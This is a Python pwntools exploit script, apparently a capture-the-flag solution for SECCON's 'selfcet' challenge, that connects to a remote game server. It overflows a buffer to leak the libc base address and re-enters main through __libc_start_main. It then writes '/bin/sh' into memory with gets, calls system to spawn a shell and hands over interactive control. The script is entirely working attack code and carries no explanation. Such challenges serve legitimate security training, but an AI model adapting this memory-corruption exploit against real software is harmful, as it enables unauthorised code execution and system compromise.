from pwn import *
#io = process("./xor",aslr=True)
io = remote("selfcet.seccon.games",9999)
libc = ELF("./libc.so.6")

delay = 0.2

main = 0x401209
binshStr = 0x404100

# leak libc
padding = p64(0x403fc8) * int((0x20+0x20+0x8+0x8)/8)

time.sleep(delay)
io.send(padding + b"\x00\x00")

io.recvuntil("xor: ")
libc.address = u64(io.recv(6).ljust(8,b"\x00")) - 0x29dc0 
log.info("LIBC BASE: " + hex(libc.address))

# restart the binary
exploit  = b"A"*0x20
exploit += p64(main) # error (2nd & 3rd argument) (for some reason it jmps to here???)
exploit += p64(main) # status (and 4 excess bytes)
exploit += p64(libc.symbols["__libc_start_main"]) 
time.sleep(delay)
io.send(exploit)


# gets /bin/sh string into random memory
exploit  = b"A"*0x40 + b"B"*0x8
exploit += p64(binshStr)
exploit += p64(libc.symbols["gets"])
time.sleep(delay)
io.send(exploit)

time.sleep(delay)
io.sendline(b"/bin/sh\x00")

#gdb.attach(io,gdbscript="break *0x4011af")

# system("/bin/sh")
exploit  = b"A"*0x20 + b"B"*0x8
exploit += p64(binshStr)
exploit += p64(libc.symbols["system"])
time.sleep(delay)
io.send(exploit)

io.interactive()
